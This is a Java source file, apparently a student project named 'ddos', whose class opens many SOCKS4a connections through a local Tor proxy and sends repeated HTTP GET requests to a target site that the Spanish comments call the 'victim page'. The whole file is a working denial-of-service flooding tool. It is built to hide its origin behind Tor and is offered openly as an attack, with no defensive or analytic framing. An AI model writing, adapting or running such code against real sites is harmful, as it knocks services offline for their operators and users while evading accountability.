/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ddos;


import java.io.*;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Emanuelle
 */
public class ddosObject extends Thread{
    
    
        private int cantidadHilos = 0;  //Cantidad de hilos que el usuario digito
       
        private String targetHostname;   // La pagina victima
  
	static int proxyPort = 9050;    // Puerto tor por defecto
	
	static String proxyAddr = "localhost";   // 127.0.0.1
	
	final static byte CD = (byte) 0x01; // Este byte le dice al socket que se conecte, 0x02 para que haya un binding
	
	final static byte TOR_RESOLVE = (byte) 0xF0;   // Este byte permite al socket resolver consultas con el dns de tor
	
	final static byte VN = (byte) 0x04;     // Byte que permite ver si los sockets son SOCKS4 o SOCKS4a
	
	final static byte SOCKS_DELIM = (byte) 0x00;    // Delimitador nulo necesario para terminar el socket
	
	final static int SOCKS4A_FAKEIP = (int) 0x01;    // Byte que permite al socket habilitarse, se setea con el campo 0.0.0.1
	
        /*
        
        The client connects to the SOCKS server and sends a CONNECT request when
        it wants to establish a connection to an application server. The client
        includes in the request packet the IP address and the port number of the
        destination host, and userid, in the following format.

                        +----+----+----+----+----+----+----+----+----+----+....+----+
                        | VN | CD | DSTPORT |      DSTIP        | USERID       |NULL|
                        +----+----+----+----+----+----+----+----+----+----+....+----+
         # of bytes:	   1    1      2              4           variable       1

        VN is the SOCKS protocol version number and should be 4. CD is the
        SOCKS command code and should be 1 for CONNECT request. NULL is a byte
        of all zero bits.

        
        */
        
        /**
         * @brief Configura el socket manualmente con los bytes, hay que notar que es SOCKS4a no SOCKS4
         * @param targetHostname Pagina victima
         * @param targetPort Puerto 80 por defecto
         * @param connectByte Byte que le dice al socket que se conecte
         * @return El socket configurado correctamente
         * @throws IOException 
         */
        static Socket TorSocketPre(String targetHostname, int targetPort, byte connectByte) 
	throws IOException {
	
		Socket s;
		System.out.println("Abriendo coneccion a "+targetHostname+":"+targetPort+
				" via proxy "+proxyAddr+":"+proxyPort+" de tipo "+connectByte);
		s = new Socket(proxyAddr, proxyPort);
                System.out.println("El socket se creo exitosamente");
		DataOutputStream os = new DataOutputStream(s.getOutputStream());
		os.writeByte(VN);
		os.writeByte(connectByte);
		// 2 bytes 
		os.writeShort(targetPort);
		// 4 bytes, high byte first
		os.writeInt(SOCKS4A_FAKEIP);
		os.writeByte(SOCKS_DELIM);
		os.writeBytes(targetHostname);
		os.writeByte(SOCKS_DELIM);
                System.out.println("Socket configurado correctamente");
		return(s);
                
	}

	/**
         * @brief Sirve para instanciar un socket e imprimir si se creo correctamente o hay un error 
         * @param targetHostname Pagina victima
         * @param targetPort Puerto 80 por defecto
         * @return Retorna el socket configurado
         * @throws IOException 
         */
	static Socket TorSocket(String targetHostname, int targetPort) 
	throws IOException {
		Socket s = TorSocketPre(targetHostname,targetPort,CD);
		DataInputStream is = new DataInputStream(s.getInputStream());


		byte version = is.readByte();
		byte status = is.readByte();
                System.out.println("Imprimiendo estado del socket...");
		if(status != (byte)90) {		
			throw(new IOException(SockError(status)));
		}
                System.out.println("status: "+SockError(status));
		//int port = is.readShort();
		//int ipAddr = is.readInt();
                
                
		return(s);
	}
        
        /**
         * @brief Segun los errores especificados en la pagina de los sockets, se va haciendo un case con sus respectivos casos 
         * @param status El estado del socket
         * @return Un string que devuelve el numero del error y la descripcion
         */
	static String SockError(byte status) {
		
		String error;
		switch(status) {
		case 90:  
			error = status+" Request granted.";
			break;
		case 91:
			error = status+" Request rejected/failed.";
			break;
		case 92:
			error = status+" Request rejected: SOCKS server cannot connect to identd on the client.";
			break;
		case 93:
			error = status+" Request rejected: the client program and identd report different user-ids.";
			break;
		default:
			error = status+" Unknown SOCKS status code.";									
		}
		return(error);
		
	}
        
        
        /**
         * @brief Sirve para poder imprimir el GET de la pagina atacada
         * @param s Es el socket utilizado para el GET
         * @throws IOException 
         */
	public void llamarGet(Socket s) throws IOException{
              
		PrintWriter pw = new PrintWriter(s.getOutputStream());
		pw.println("GET / HTTP/1.1");
		pw.println("");
		pw.println("Host: " + targetHostname);
		pw.flush();
		BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
		String t;
		while((t = br.readLine()) != null) System.out.println(t);
		br.close();
	}
	
    /**
     * @brief Constructor por defecto
     * @param cantidadHilos Cantidad de hilos insertado
     * @param targetHostname  La pagina a atacar
     */    
    ddosObject(int cantidadHilos,String targetHostname) {
        this.cantidadHilos = cantidadHilos;
        this.targetHostname = targetHostname;
    }

    	
    /**
     * @brief Es el run de los threads, se llama en la clase DdosClass
     * @throws java.io.IOException
     */
        @Override
    public void run() {
        
	
	int targetPort = 80;
        
            try {
                for(int i = 0; i< cantidadHilos; i++){
                    Socket s = TorSocket(targetHostname, targetPort);
					llamarGet(s);
                }
                
            } catch (IOException ex) {
                Logger.getLogger(ddosObject.class.getName()).log(Level.SEVERE, null, ex);
            }
    }
        
}
